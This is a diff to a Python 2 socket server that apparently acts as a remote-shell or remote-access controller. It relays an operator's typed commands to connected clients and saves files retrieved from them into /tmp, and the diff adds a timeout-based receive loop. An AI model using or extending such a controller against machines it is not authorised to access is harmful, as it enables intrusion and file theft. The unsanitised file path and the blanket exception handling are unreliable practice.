@@ -28,6 +28,19 @@ class server():
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
+    def receive_from(self, socket):
+        buffer = ""
+        socket.settimeout(1)
+        try:
+            while True:
+                data = socket.recv(4096)
+                if not data:
+                    break
+                buffer += data
+        except:
+            pass
+        return buffer
+
     def handle_client(self, client_sock):
         while True:
             self.buf = raw_input(self.prompt)
@@ -43,9 +56,9 @@ class server():
             elif "get-file" in self.buf:
                 client_sock.send(self.buf)
                 self.log_file.write("command sent : {0}\n".format(self.buf))
-                data = client_sock.recv(4096)
+                data = self.receive_from(client_sock)
                 if "-1" in str(data):
-                    print "Error With the file, this error is client side" 
+                    print "Error With the file, this error is client side"
                 else:
                     with open("/tmp/" + self.buf[9:], 'wb') as f:
                         f.write(data)
@@ -54,7 +67,7 @@ class server():
             else:
                 client_sock.send(self.buf)
                 self.log_file.write("command sent : {0}\n".format(self.buf))
-                self.buf = client_sock.recv(2048)
+                self.buf = self.receive_from(client_sock)
             print self.buf
 
     def handle_old_client(self, client_sock):
